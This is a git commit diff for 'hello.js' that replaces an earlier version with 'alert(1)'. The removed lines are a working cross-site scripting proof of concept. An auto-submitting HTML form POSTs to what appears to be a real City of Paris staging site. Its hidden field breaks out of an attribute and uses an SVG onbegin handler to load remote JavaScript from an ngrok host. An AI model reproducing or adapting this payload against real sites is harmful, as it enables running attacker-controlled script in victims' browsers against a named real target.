b878d260bd09c9da3cf39f869b447ccc5ac018fc
Johan <31695713+Johbrun@users.noreply.github.com>
2026-03-20 21:49:14 +0100

    Update hello.js

--- hello.js
+++ hello.js
@@ -1,15 +1,1 @@
-<html>
-
-<body>
-    <form method="POST"
-        action="https://stage-apprentissage.paris.fr/?_4x1F8B08000000000000FF75903B6BC3301845FF8DC6A0975F830637B24AB640F06CFC1089525B329F245AFFFB3A899642BADDE19E03F70EB3BDDCDCF7D941E8E7737FD52240D4C87FE9ED535BB9595154BCE094655D5E92ACC2AC236DD66142738C14B8E5CE307E312BB8517B7F0A7A11EBD377B8BB61753E187B3D3C7A085C3FD9B80C1AFE687396F1AE6869D2821E219AA0A11E1F428191836947081AFB79D610A399DEF124F193F1EBDC6FAF4D69CF9E856C2E47F41FCCCB441B6B42DB9EE4DB52EAF89F51AC606CE0F0BC4A9435AD4AA5B064743F89A80F298F0D510DADA5C45CE5BFA78CA6C667010000"
-        id="xss">
-        <input type="hidden" name="fldKeywords" value='&quot;aa' />
-        <input type="hidden" name="selContractTypes" value='CCCCT"><svg><set /onbegin=var s=document.createElement(`
-      script`);s.src=`https://vernita-unannulled-rhetorically.ngrok-free.dev/hello.js`
-      ;document.body.appendChild(s)><b' />
-    </form>
-    <script>document.getElementById('xss').submit();</script>
-</body>
-
-</html>
+alert(1)
